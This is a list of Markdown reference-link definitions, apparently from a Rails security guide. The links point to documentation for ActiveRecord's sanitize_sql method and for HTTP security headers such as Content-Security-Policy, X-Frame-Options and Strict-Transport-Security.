[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
